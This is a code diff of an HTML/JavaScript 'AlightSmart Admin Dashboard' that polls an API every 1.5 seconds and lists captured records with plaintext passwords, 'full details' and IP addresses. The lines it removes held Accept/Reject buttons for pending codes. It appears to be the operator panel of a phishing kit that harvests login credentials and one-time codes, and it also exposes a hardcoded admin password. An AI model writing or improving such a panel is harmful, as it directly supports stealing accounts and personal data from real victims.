@@ -13,11 +13,10 @@
         th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
         th { background: #e2e8f0; font-weight: 600; }
         tr:hover { background: #f8fafc; }
-        .btn { padding: 7px 14px; margin: 3px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
+        .btn { padding: 6px 12px; margin: 3px; border: none; border-radius: 6px; cursor: pointer; }
         .accept { background: #22c55e; color: white; }
         .reject { background: #ef4444; color: white; }
         .delete { background: #64748b; color: white; }
-        .restore { background: #eab308; color: black; }
         .refresh-btn { background: #3b82f6; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 10px; font-weight: 600; }
         .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 10px; }
         .status { text-align: center; padding: 12px; background: #f0f9ff; color: #0369a1; font-weight: 500; }
@@ -27,7 +26,7 @@
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Live Records</p>
+            <p>Live Records • Password: tunde6035</p>
         </div>
 
         <div class="status" id="status">Loading records...</div>
@@ -44,7 +43,6 @@
                     <th>Password</th>
                     <th>Full Details</th>
                     <th>IP Address</th>
-                    <th>Action</th>
                 </tr>
             </thead>
             <tbody></tbody>
@@ -58,7 +56,7 @@
             try {
                 const res = await fetch('/api/records?' + Date.now(), {
                     cache: 'no-store',
-                    headers: { 'Cache-Control': 'no-cache' }
+                    headers: { 'Cache-Control': 'no-cache, no-store' }
                 });
                 const records = await res.json();
                 const tbody = document.querySelector('#recordsTable tbody');
@@ -67,16 +65,6 @@
                 document.getElementById('status').textContent = `✅ ${records.length} Records Loaded`;
 
                 records.forEach(r => {
-                    let action = '';
-                    if (r.address && r.address.includes("Pending")) {
-                        action = `
-                            <button class="btn accept" onclick="confirmCode(${r.id}, 'Confirmed')">Accept</button>
-                            <button class="btn reject" onclick="confirmCode(${r.id}, 'Rejected')">Reject</button>
-                        `;
-                    } else {
-                        action = r.address && r.address.includes("Confirmed") ? "✅ Confirmed" : "❌ Rejected";
-                    }
-
                     tbody.innerHTML += `
                         <tr>
                             <td>${r.timestamp || '-'}</td>
@@ -85,37 +73,16 @@
                             <td><code>${r.password || '-'}</code></td>
                             <td style="max-width:500px; word-break:break-all;">${r.address || '-'}</td>
                             <td>${r.ip || 'Unknown'}</td>
-                            <td>
-                                ${action}
-                                <button class="btn delete" onclick="deleteRecord(${r.id})">🗑️ Delete</button>
-                            </td>
                         </tr>`;
                 });
             } catch (e) {
-                document.getElementById('status').innerHTML = "❌ Error loading - Click Force Refresh";
+                document.getElementById('status').innerHTML = "❌ Error loading records";
             }
         }
 
-        async function confirmCode(id, status) {
-            if (confirm(`Mark as ${status}?`)) {
-                await fetch('/api/confirm-code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id, status })
-                });
-                loadRecords();
-            }
-        }
-
-        async function deleteRecord(id) {
-            if (confirm("Delete this record?")) {
-                await fetch('/api/delete-record', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id })
-                });
-                loadRecords();
-            }
+        function forceRefresh() {
+            document.getElementById('status').innerHTML = "🔄 Forcing Refresh...";
+            loadRecords();
         }
 
         async function clearRecords() {
@@ -125,12 +92,6 @@
             }
         }
 
-        function forceRefresh() {
-            document.getElementById('status').innerHTML = "🔄 Forcing Refresh...";
-            loadRecords();
-        }
-
-        // Password input hidden
         window.onload = () => {
             const pass = prompt("Enter Admin Password:");
             if (pass !== ADMIN_PASSWORD) {
@@ -139,7 +100,7 @@
                 return;
             }
             loadRecords();
-            setInterval(loadRecords, 2000);
+            setInterval(loadRecords, 1500);   // Auto refresh every 1.5 seconds
         };
     </script>
 </body>
